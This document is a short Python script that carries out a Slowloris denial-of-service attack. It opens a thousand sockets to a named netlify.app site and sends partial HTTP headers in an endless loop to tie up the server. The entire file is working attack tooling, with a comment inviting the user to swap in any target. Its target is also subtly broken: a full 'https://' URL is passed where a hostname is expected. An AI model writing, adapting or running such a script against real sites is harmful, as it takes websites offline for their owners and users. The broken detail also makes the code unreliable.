import socket
import time
import threading

TARGET = "https://jastegh.netlify.app"  # Change to your target
PORT = 80
NUM_SOCKETS = 1000

def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET, PORT))
    s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode("utf-8"))
    s.send(f"Host: {TARGET}\r\n".encode("utf-8"))
    return s

def slowloris():
    sockets = []
    print("Creating sockets...")
    for _ in range(NUM_SOCKETS):
        try:
            s = init_socket()
            sockets.append(s)
        except Exception as e:
            print(f"Socket creation failed: {e}")

    while True:
        print(f"Sending keep-alive headers to {len(sockets)} sockets...")
        for s in list(sockets):
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except Exception:
                sockets.remove(s)
                try:
                    s = init_socket()
                    sockets.append(s)
                except Exception as e:
                    print(f"Recreating socket failed: {e}")
        time.sleep(0.5)

if __name__ == "__main__":
    slowloris()